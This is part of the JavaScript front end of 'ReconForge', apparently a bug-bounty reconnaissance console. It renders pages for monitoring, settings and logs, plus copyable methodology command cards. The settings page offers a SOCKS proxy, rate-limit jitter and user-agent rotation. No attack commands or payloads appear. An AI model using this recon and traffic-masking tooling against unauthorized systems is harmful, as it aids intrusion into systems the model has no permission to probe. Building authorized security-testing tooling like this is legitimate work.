      </table>
    ` : `<div class="tbl-empty">No targets enrolled. Add one below to start continuous monitoring.</div>`;

    const enroll = `
      <div style="display:flex; gap:8px; margin-top:10px;">
        <input id="mon-domain" type="text" placeholder="example.com" spellcheck="false" style="flex:1;">
        <button class="btn btn-primary" onclick="ReconForge.enrollMonitor()">▸ Monitor target</button>
      </div>
      <div class="form-help">Passive enum + httpx on a 4h→7d adaptive cadence. New assets reset the cadence to 4h, fire a <span class="mono">notify</span> alert, and flow to CyberBrain as review drafts. Scope Guard gates every scan.</div>
    `;

    return `
      ${renderWorkspaceHead("Monitors", "Operations", "Continuous attack-surface monitoring.")}
      ${panel("Enrolled targets", table + enroll)}
      ${state.guideMode ? guidePanel("Adaptive cadence", "Each target is scanned every 4h while it keeps producing new assets. After ~3 quiet days the interval steps up (8h → 12h → 24h → 48h → 96h) to a 7-day ceiling; any new asset snaps it back to 4h. Monitor scans are passive + httpx only — loud active testing stays in the exploit cards.") : ""}
    `;
};

function fmtInterval(secs) {
    secs = secs || 0;
    if (secs >= 86400 && secs % 86400 === 0) return (secs / 86400) + "d";
    return Math.round(secs / 3600) + "h";
}
function fmtWhen(s) {
    if (!s) return "due now";
    const d = new Date(s.replace(" ", "T") + "Z");
    if (isNaN(d.getTime())) return s;
    const diff = d.getTime() - Date.now();
    if (diff <= 0) return "due now";
    const h = Math.floor(diff / 3600000), m = Math.floor((diff % 3600000) / 60000);
    return h > 0 ? `in ${h}h ${m}m` : `in ${m}m`;
}
function fmtQuiet(s) {
    if (!s) return "—";
    const d = new Date(s.replace(" ", "T") + "Z");
    if (isNaN(d.getTime())) return "—";
    return Math.max(0, Math.floor((Date.now() - d.getTime()) / 86400000)) + "d";
}

PAGES.resources = function () {
    const s = state.apiState || {};
    const r = s.resources || {};
    const cpu  = r.cpu  ?? 0;
    const mem  = r.memory ?? 0;
    const disk = r.disk ?? 0;
    return `
      ${renderWorkspaceHead("Resources", "Operations", "Live host resource usage.")}
      ${renderMetrics([
        { label: "CPU",    value: cpu  + "%", kind: cpu  > 80 ? "error" : (cpu  > 50 ? "processing" : "") },
        { label: "Memory", value: mem  + "%", kind: mem  > 85 ? "error" : (mem  > 70 ? "processing" : "") },
        { label: "Disk",   value: disk + "%", kind: disk > 90 ? "error" : (disk > 80 ? "processing" : "") },
      ])}
    `;
};

PAGES.settings = function () {
    const c = state.config || {};
    const proxy = c.opsec_http_proxy || "";
    const rl = (c.opsec_rate_limit == null ? 50 : c.opsec_rate_limit);
    const delay = c.opsec_delay || "";
    const randUA = (c.opsec_random_agent !== false);
    return `
      ${renderWorkspaceHead("Settings", "Admin", "System configuration.")}
      ${panel("OPSEC — rule #1 (applied to every target-touching scan)", `
        <div class="form-grid">
          <div><label class="form-label">HTTP/SOCKS proxy</label><input id="opsec-proxy" type="text" value="${escapeAttr(proxy)}" placeholder="socks5://127.0.0.1:9050" spellcheck="false"></div>
          <div><label class="form-label">Rate limit (req/s)</label><input id="opsec-rl" type="number" value="${escapeAttr(String(rl))}" min="1"></div>
          <div><label class="form-label">Per-request delay / jitter</label><input id="opsec-delay" type="text" value="${escapeAttr(delay)}" placeholder="200ms (monitor default)" spellcheck="false"></div>
          <div><label class="form-label">Random User-Agent</label>
            <label class="radio-pill ${randUA ? "selected" : ""}"><input id="opsec-rua" type="checkbox" ${randUA ? "checked" : ""} style="margin-right:6px;">rotate UA (off when a program UA is pinned)</label>
          </div>
        </div>
        <div class="form-help">Proxy routes <em>every</em> tool (curl, httpx, nuclei, dnsx, nikto, agent runner). Rate limit + jitter throttle target-touching tools. Program-identity headers (e.g. <span class="mono">X-Intigriti-Username</span>) are attached automatically from your platform handles. Passive sources never touch the target.</div>
        <div class="spacer-md"></div>
        <button class="btn btn-primary" onclick="ReconForge.saveOpsec()">▸ Save OPSEC</button>
      `)}
      ${panel("API keys", `
        <div class="form-grid">
          <div><label class="form-label">GitHub token</label><input type="password" placeholder="ghp_..."></div>
          <div><label class="form-label">Chaos key</label><input type="password" placeholder="..."></div>
          <div><label class="form-label">Shodan key</label><input type="password" placeholder="..."></div>
          <div><label class="form-label">SecurityTrails key</label><input type="password" placeholder="..."></div>
          <div><label class="form-label">Interactsh URL</label><input type="text" placeholder="oast.yourdomain.com"></div>
          <div><label class="form-label">AWS profile</label><input type="text" placeholder="default"></div>
        </div>
        <div class="spacer-md"></div>
        <button class="btn btn-primary" onclick="ReconForge.toast('Settings saved.', 'success')">▸ Save</button>
      `)}
      ${panel("Pipeline tuning", `
        <div class="form-grid">
          <div><label class="form-label">Threads</label><input type="number" value="10"></div>
          <div><label class="form-label">Rate limit (req/s)</label><input type="number" value="50"></div>
          <div><label class="form-label">First sub timeout (s)</label><input type="number" value="600"></div>
          <div><label class="form-label">Min enum tools required</label><input type="number" value="2"></div>
        </div>
      `)}
    `;
};

PAGES.users = function () {
    return `
      ${renderWorkspaceHead("Users", "Admin", "Operators with console access.")}
      ${panel("Operator roster", `<div class="tbl-empty">Loading…</div>`)}
    `;
};

PAGES.backups = function () {
    return `
      ${renderWorkspaceHead("Backups", "Admin", "Database snapshots.")}
      ${panel("Snapshots", `<div class="tbl-empty">No snapshots yet.</div>`)}
    `;
};

PAGES.logs = function () {
    return `
      ${renderWorkspaceHead("System Logs", "Admin", "Server diagnostic stream.")}
      ${panel("Stream", `<div class="tbl-empty">See Activity Console at the bottom for live events.</div>`)}
    `;
};

// ── Components ────────────────────────────────────────────────────
function renderWorkspaceHead(title, eyebrow, sub) {
    return `
      <div class="workspace-header">
        <div>
          <div class="workspace-eyebrow">${escapeHTML(eyebrow)}</div>
          <h1 class="workspace-title">${escapeHTML(title)}</h1>
          ${sub ? `<div class="text-sec" style="margin-top:4px;">${escapeHTML(sub)}</div>` : ""}
        </div>
        <div class="workspace-actions">
          <button class="btn btn-ghost btn-sm" onclick="ReconForge.openPalette()">⌘K palette</button>
          <button class="btn btn-ghost btn-sm" onclick="ReconForge.toggleGuide()">${state.guideMode ? "guide on" : "guide off"}</button>
        </div>
      </div>
    `;
}

function renderMetrics(metrics) {
    return `<div class="metrics-grid">${metrics.map(m => `
      <div class="metric ${m.kind || ""}">
        <div class="metric-label">${escapeHTML(m.label)}</div>
        <div class="metric-value">${escapeHTML(String(m.value))}</div>
        ${m.sub ? `<div class="metric-sub">${escapeHTML(m.sub)}</div>` : ""}
      </div>
    `).join("")}</div>`;
}

function renderTargetStatusPanel() {
    return panel("Target status", `
      <div class="status-panel">
        <dt>Target</dt>    <dd>${escapeHTML(state.target || "—")}</dd>
        <dt>Scope</dt>     <dd>${state.target ? `<span class="badge badge-success">VALIDATED</span>` : `<span class="badge badge-muted">PENDING</span>`}</dd>
        <dt>Risk mode</dt> <dd><span class="risk-badge" data-risk="${state.riskMode}">${state.riskMode.toUpperCase()}</span></dd>
        <dt>Workspace</dt> <dd>${escapeHTML(state.workspace || "—")}</dd>
        <dt>Export</dt>    <dd class="mono" style="font-size: 11px;">${escapeHTML(state.cyberbrainPath || "—")}</dd>
      </div>
    `);
}

function renderReconChecklist() {
    const items = [
        { id: "target",    label: "Target loaded",          done: !!state.target,                   current: !state.target },
        { id: "scope",     label: "Scope defined",          done: !!(state.target && state.workspace), current: !!state.target && !state.workspace },
        { id: "passive",   label: "Passive recon",          done: false, current: false },
        { id: "active",    label: "Active recon",           done: false, current: false },
        { id: "urls",      label: "URL collection",         done: false, current: false },
        { id: "js",        label: "JS mining",              done: false, current: false },
        { id: "params",    label: "Parameter discovery",    done: false, current: false },
        { id: "findings",  label: "Findings drafted",       done: false, current: false },
        { id: "export",    label: "Evidence exported",      done: false, current: false },
    ];
    return panel("Recon checklist", `
      <ul class="checklist">
        ${items.map(i => `
          <li class="${i.done ? "done" : ""}">
            <span class="check ${i.done ? "done" : ""} ${i.current ? "current" : ""}">${i.done ? "✓" : (i.current ? "•" : " ")}</span>
            <span class="label">${escapeHTML(i.label)}</span>
          </li>
        `).join("")}
      </ul>
    `);
}

function renderEvidenceTimeline(events) {
    if (!events || !events.length) {
        return panel("Timeline", `<div class="tbl-empty">No events yet.</div>`);
    }
    return panel("Timeline", `
      <ul class="timeline">
        ${events.map(e => `
          <li>
            <span class="t-time">${escapeHTML(e.time)}</span>
            <span class="t-msg"><span class="t-kind">${escapeHTML(e.kind || "log")}</span>${escapeHTML(e.text)}</span>
          </li>
        `).join("")}
      </ul>
    `);
}

function renderCyberBrainPanel() {
    const root = state.cyberbrainPath || "CyberBrain/BugBounty/" + (state.workspace || "<workspace>");
    return panel("CyberBrain export", `
      <div class="vault">
        <div class="vault-path">${escapeHTML(root)}</div>
        <ul>
          <li class="${state.target ? "done" : "todo"}">00_Target.md</li>
          <li class="${state.workspace ? "done" : "todo"}">01_Scope.md</li>
          <li class="todo">02_Recon.md</li>
          <li class="todo">03_Assets.md</li>
          <li class="todo">04_Testing.md</li>
          <li class="todo">05_Evidence.md</li>
          <li class="todo">06_Report_Draft.md</li>
          <li class="todo">commands/</li>
          <li class="todo">findings/</li>
          <li class="todo">artifacts/</li>
        </ul>
      </div>
    `);
}

function renderJobsTable(rows) {
    return `
      <table class="tbl">
        <thead><tr><th>Domain</th><th>Status</th><th>Step</th><th>Subdomains</th><th>Started</th></tr></thead>
        <tbody>
          ${rows.map(j => `
            <tr>
              <td class="mono">${escapeHTML(j.domain || "—")}</td>
              <td>${statusBadge(j.status)}</td>
              <td class="mono text-sec">${escapeHTML(j.current_step || "—")}</td>
              <td>${j.subdomain_count || 0}</td>
              <td class="mono text-sec">${escapeHTML(j.started_at || j.queued_at || "—")}</td>
            </tr>
          `).join("")}
        </tbody>
      </table>
    `;
}

function statusBadge(s) {
    const map = {
        running:   ["processing", "RUNNING"],
        pending:   ["muted",      "PENDING"],
        completed: ["success",    "DONE"],
        failed:    ["error",      "FAILED"],
        cancelled: ["muted",      "CANCELLED"],
    };
    const [cls, label] = map[s] || ["muted", String(s || "—").toUpperCase()];
    return `<span class="badge badge-${cls}">${label}</span>`;
}

function panel(title, body) {
    return `
      <div class="panel">
        <div class="panel-head"><span>${escapeHTML(title)}</span></div>
        <div class="panel-body">${body}</div>
      </div>
    `;
}

function guidePanel(title, body) {
    return `
      <div class="panel" style="border-color: var(--accent-purple);">
        <div class="panel-head" style="color: var(--accent-purple);">
          <span>guide · ${escapeHTML(title)}</span>
          <span class="panel-tag">optional</span>
        </div>
        <div class="panel-body text-sec">${escapeHTML(body)}</div>
      </div>
    `;
}

function riskPill(value, label, selected) {
    return `
      <label class="radio-pill ${selected ? "selected" : ""}" onclick="ReconForge.setRisk('${value}')">
        ${escapeHTML(label)}
      </label>
    `;
}

function pageNotFound(route) {
    return () => `
      ${renderWorkspaceHead(route.toUpperCase(), "Coming Online", "This module is registered but not yet wired.")}
      ${panel("Status", `<div class="tbl-empty">Module <span class="mono">${escapeHTML(route)}</span> placeholder. Wire via PAGES.${escapeHTML(route)} in <span class="mono">ui/spa/app.js</span>.</div>`)}
    `;
}

// Methodology page template — used by passive/active/urls/js/test/* pages.
function renderMethodologyPage(routeId, title, group, defaultRisk, commands) {
    let html = renderWorkspaceHead(title, group, "Methodology-phase commands. Copy, run, archive.");
    html += `<div class="workspace-cols"><div>`;
    commands.forEach((c, i) => {
        html += renderForge({
            phase: title,
            risk: c.risk || defaultRisk,
            target: state.target || "<target>",
            outputDir: cyberbrainSub(routeId),
            label: c.label,
            cmd: c.cmd,
            note: c.note,
            idx: i,
        });
    });
    html += `</div><div>`;
    html += renderTargetStatusPanel();
    html += renderReconChecklist();
    html += `</div></div>`;
    return html;
}

function renderForge(opts) {
    const riskBadge = `<span class="risk-badge" data-risk="${opts.risk}">${opts.risk.toUpperCase()}</span>`;
    const id = "forge-cmd-" + opts.idx;
    return `
      <div class="forge">
        <div class="forge-head">
          <span>${escapeHTML(opts.label)}</span>
          ${riskBadge}
        </div>
        <dl class="forge-meta">
          <dt>Phase</dt>  <dd>${escapeHTML(opts.phase)}</dd>
          <dt>Target</dt> <dd>${escapeHTML(opts.target)}</dd>
          <dt>Output</dt> <dd class="text-mute">${escapeHTML(opts.outputDir)}</dd>
        </dl>
        <div class="forge-cmd" id="${id}">${escapeHTML(opts.cmd)}</div>
        <div class="forge-actions">
          <button class="btn btn-sm btn-primary" onclick="ReconForge.copyForge('${id}')">▸ Copy</button>
          <button class="btn btn-sm btn-ghost" onclick="ReconForge.toast('Saved to workspace.', 'success')">Save to Workspace</button>
          <button class="btn btn-sm btn-ghost" onclick="ReconForge.toast('Added to notes.', 'success')">Add to Notes</button>
        </div>
        ${state.guideMode && opts.note ? `
          <div class="forge-guide">
            <div class="forge-guide-title">why this matters</div>
            ${escapeHTML(opts.note)}
          </div>
        ` : ""}
      </div>
    `;
}

function cyberbrainSub(route) {
    const base = state.cyberbrainPath || ("CyberBrain/BugBounty/" + (state.workspace || "<workspace>"));
    return base + "/02_Recon/" + route + "/";
}

// ── Console ──────────────────────────────────────────────────────
function consoleLog(kind, text) {
    const now = new Date();
    const t = now.toTimeString().slice(0, 8);
    state.consoleEvents.unshift({ kind, text, time: t });
    if (state.consoleEvents.length > 200) state.consoleEvents.length = 200;
    renderConsole();
}

function renderConsole() {
    const console_el = document.getElementById("activity-console");
    console_el.dataset.state = state.consoleState;
    const count = state.consoleEvents.length;
    document.getElementById("console-count").textContent = `${count} event${count === 1 ? "" : "s"}`;
    const last = state.consoleEvents[0];
    document.getElementById("console-summary").textContent =
        last ? `Last: ${last.text}` : "Console idle";
    document.getElementById("console-toggle-label").textContent =
        state.consoleState === "expanded" ? "minimize" : "expand";

    const stream = document.getElementById("console-stream");
    stream.innerHTML = state.consoleEvents.map(e => `
      <div class="console-line" data-c="${e.kind}">
        <span class="c-time">${escapeHTML(e.time)}</span>
        <span>${escapeHTML(e.text)}</span>
      </div>
    `).join("");
}

function toggleConsole() {
    state.consoleState = state.consoleState === "expanded" ? "minimized" : "expanded";
    LS.set("consoleState", state.consoleState);
    renderConsole();
}

function clearConsole() {
    state.consoleEvents = [];
    renderConsole();
}

// ── Guide mode ───────────────────────────────────────────────────
function toggleGuide() {
    state.guideMode = !state.guideMode;
    LS.set("guideMode", state.guideMode);
    applyGuideState();
    renderWorkspace();
}

function applyGuideState() {
    const btn = document.getElementById("guide-state");
    if (btn) btn.textContent = state.guideMode ? "guide on" : "guide off";
    const wrap = btn ? btn.parentElement : null;
    if (wrap) wrap.classList.toggle("on", state.guideMode);
}

// ── Command palette ──────────────────────────────────────────────
function paletteItems() {
    const items = [];
    // Navigation items
    for (const group of NAV) {
        for (const it of group.items) {
            items.push({ kind: "nav", tag: group.title, label: it.label, route: it.route });
        }
    }
    // Quick actions
    items.push({ kind: "action", tag: "action", label: "Toggle guide mode", action: () => { toggleGuide(); } });
    items.push({ kind: "action", tag: "action", label: "Toggle bottom console", action: () => { toggleConsole(); } });
    items.push({ kind: "action", tag: "action", label: "Clear activity console", action: () => { clearConsole(); } });
    items.push({ kind: "action", tag: "action", label: "Sign out", action: () => { logout(); } });
    return items;
}

function openPalette() {
    state.palette.open = true;
    state.palette.query = "";
    state.palette.selected = 0;
    document.getElementById("palette").hidden = false;
    const input = document.getElementById("palette-input");
    input.value = "";
    setTimeout(() => input.focus(), 30);
    renderPalette();
}

function closePalette() {
    state.palette.open = false;
    document.getElementById("palette").hidden = true;
}

function renderPalette() {
    const q = state.palette.query.toLowerCase().trim();
    const items = paletteItems().filter(it =>
        !q || it.label.toLowerCase().includes(q) || (it.tag || "").toLowerCase().includes(q)
    );
    state.palette.items = items;
    if (state.palette.selected >= items.length) state.palette.selected = Math.max(0, items.length - 1);
    const results = document.getElementById("palette-results");
    if (!items.length) {
        results.innerHTML = `<div class="palette-empty">no results for "${escapeHTML(q)}"</div>`;
        return;
    }
    results.innerHTML = items.map((it, i) => `
      <div class="palette-result ${i === state.palette.selected ? "active" : ""}" onclick="ReconForge.executePalette(${i})">
        <span>${escapeHTML(it.label)}</span>
        <span class="palette-tag">${escapeHTML(it.tag || "")}</span>
      </div>
    `).join("");
}

function executePalette(i) {
    const item = state.palette.items[i];
    if (!item) return;
    closePalette();
    if (item.kind === "nav") navigateTo(item.route);
    else if (item.kind === "action" && typeof item.action === "function") item.action();
}

// ── Intake handlers ──────────────────────────────────────────────
function saveIntake() {
    const target    = (document.getElementById("intake-target").value || "").trim();
    const workspace = (document.getElementById("intake-workspace").value || "").trim() || target;
    const cyberbrain = (document.getElementById("intake-cyberbrain").value || "").trim();
    if (!target) { toast("Target domain required.", "error"); return; }
    state.target = target;
    state.workspace = workspace;
    state.cyberbrainPath = cyberbrain || ("CyberBrain/BugBounty/" + target);
    state.intakeDraft.target     = target;
    state.intakeDraft.workspace  = workspace;
    state.intakeDraft.cyberbrain = state.cyberbrainPath;
    LS.set("target", target);
    LS.set("workspace", workspace);
    LS.set("cyberbrainPath", state.cyberbrainPath);
    consoleLog("select", "target loaded: " + target);
    renderShellChrome();
    renderSidebar();
    renderKillchain();
    toast("Target " + target + " ready.", "success");
    navigateTo("scope");
}

function clearIntake() {
    state.target = null; state.workspace = null; state.cyberbrainPath = null;
    state.intakeDraft = { target: "", program: "", workspace: "", cyberbrain: "", scope: "", oos: "" };
    LS.set("target", null); LS.set("workspace", null); LS.set("cyberbrainPath", null);
    consoleLog("log", "target cleared");
    renderShellChrome(); renderSidebar(); renderKillchain(); renderWorkspace();
}

function setRisk(mode) {
    if (!["passive", "active", "aggressive"].includes(mode)) return;
    state.riskMode = mode;
    LS.set("riskMode", mode);
    consoleLog("log", "risk mode: " + mode);
    renderShellChrome();
    renderWorkspace();
}

function setPlatform(p) {
    consoleLog("select", "platform: " + p);
    toast("Platform " + p + " selected for export.", "info");
}

// ── Continuous monitoring (recon schedule) ───────────────────────
async function refreshState() {
    const r = await api("GET", "/api/state");
    if (r.ok) { state.apiState = r.data && (r.data.data || r.data); renderWorkspace(); }
}
async function enrollMonitor() {
    const el = document.getElementById("mon-domain");
    const domain = ((el && el.value) || "").trim().toLowerCase();
    if (!domain) { toast("Domain required.", "error"); return; }
    const r = await api("POST", "/api/schedule", { domain });
    if (r.ok) { consoleLog("success", "monitoring " + domain); toast("Monitoring " + domain, "success"); await refreshState(); }
    else { toast("Enroll failed.", "error"); }
}
async function toggleMonitor(id, enabled) {
    await api("PUT", "/api/schedule/" + id, { enabled: !!enabled });
    await refreshState();
}
async function removeMonitor(id) {
    await api("DELETE", "/api/schedule/" + id);
    consoleLog("log", "monitor removed");
    await refreshState();
}

// ── OPSEC settings ───────────────────────────────────────────────
async function ensureConfig() {
    const r = await api("GET", "/api/config");
    if (r.ok) { state.config = r.data && (r.data.data || r.data); renderWorkspace(); }
}
async function saveOpsec() {
    const rlEl = document.getElementById("opsec-rl");
    const payload = {
        opsec_http_proxy:   (document.getElementById("opsec-proxy").value || "").trim(),
        opsec_rate_limit:   parseInt(rlEl.value, 10) || 50,
        opsec_delay:        (document.getElementById("opsec-delay").value || "").trim(),
        opsec_random_agent: document.getElementById("opsec-rua").checked,
    };
    const r = await api("PUT", "/api/config", payload);
    if (r.ok) {
        state.config = Object.assign({}, state.config || {}, payload);
        consoleLog("success", "OPSEC config saved");
        toast("OPSEC settings saved.", "success");
    } else { toast("Save failed.", "error"); }
}

async function submitJob() {
    const domain = (document.getElementById("job-domain").value || "").trim();
    if (!domain) { toast("Domain required.", "error"); return; }
    const r = await api("POST", "/api/jobs", { domain });
    if (r.ok && r.data && r.data.success) {
        consoleLog("success", "job queued: " + domain);
        toast("Job queued: " + domain, "success");
        renderWorkspace();
    } else {
        consoleLog("error", "job submit failed: " + (r.data && r.data.message || r.status));
        toast("Submit failed.", "error");
    }
}

// ── Copy / clipboard ─────────────────────────────────────────────
function copyForge(id) {
    const el = document.getElementById(id);
    if (!el) return;
    const txt = el.textContent;
    if (navigator.clipboard) {
        navigator.clipboard.writeText(txt).then(
            () => { consoleLog("success", "command copied"); toast("Copied to clipboard.", "success"); },
            () => { fallbackCopy(txt); }
        );
    } else { fallbackCopy(txt); }
}

function fallbackCopy(txt) {
    const t = document.createElement("textarea");
    t.value = txt; document.body.appendChild(t); t.select();
    try { document.execCommand("copy"); consoleLog("success", "command copied"); toast("Copied to clipboard.", "success"); }
    catch (_) { toast("Copy failed.", "error"); }
    document.body.removeChild(t);
}

// ── Toast ────────────────────────────────────────────────────────
function toast(msg, kind) {
    kind = kind || "info";
    const stack = document.getElementById("toast-stack");
    const el = document.createElement("div");
    el.className = "toast " + kind;
    el.textContent = msg;
    stack.appendChild(el);
    setTimeout(() => {
        el.style.transition = "opacity 0.3s";
        el.style.opacity = "0";
        setTimeout(() => el.remove(), 320);
    }, 3000);
}

// ── Utils ────────────────────────────────────────────────────────
function escapeHTML(s) {
    return String(s == null ? "" : s)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}
function escapeAttr(s) { return escapeHTML(s); }
function tgt() { return state.target || "example.com"; }

// ── Keyboard handlers ────────────────────────────────────────────
document.addEventListener("keydown", (e) => {
    const inPalette = state.palette.open;
    const inInput = e.target && (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA");

    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
        e.preventDefault(); openPalette(); return;
    }
    if (e.key === "/" && !inInput && !inPalette) {
        e.preventDefault(); openPalette(); return;
    }
    if (e.key === "Escape" && inPalette) {
        closePalette(); return;
    }
    if (inPalette) {
        if (e.key === "ArrowDown") {
            e.preventDefault();
            state.palette.selected = Math.min(state.palette.items.length - 1, state.palette.selected + 1);
            renderPalette();
        } else if (e.key === "ArrowUp") {
            e.preventDefault();
            state.palette.selected = Math.max(0, state.palette.selected - 1);
            renderPalette();
        } else if (e.key === "Enter") {
            e.preventDefault();
            executePalette(state.palette.selected);
        }
    }
});

// Map of intake field id → draft key. Keeps the in-progress engagement form
// in state so any re-render (selecting a risk mode, the 8s poll) repopulates
// every field instead of blanking it.
const INTAKE_FIELDS = {
    "intake-target":     "target",
    "intake-program":    "program",
    "intake-workspace":  "workspace",
    "intake-cyberbrain": "cyberbrain",
    "intake-scope":      "scope",
    "intake-oos":        "oos",
};

document.addEventListener("input", (e) => {
    if (!e.target) return;
    if (e.target.id === "palette-input") {
        state.palette.query = e.target.value;
        state.palette.selected = 0;
        renderPalette();
        return;
    }
    const key = INTAKE_FIELDS[e.target.id];
    if (key) state.intakeDraft[key] = e.target.value;
});

// ── Public API exposed on window.ReconForge ──────────────────────
window.ReconForge = {
    login, logout,
    go: navigateTo,
    saveIntake, clearIntake, setRisk, setPlatform, submitJob,
    enrollMonitor, toggleMonitor, removeMonitor,
    saveOpsec,
    openPalette, closePalette, executePalette,
    toggleConsole, clearConsole,
    toggleGuide,
    copyForge,
    toast,
};

// ── Boot ─────────────────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", boot);

})();
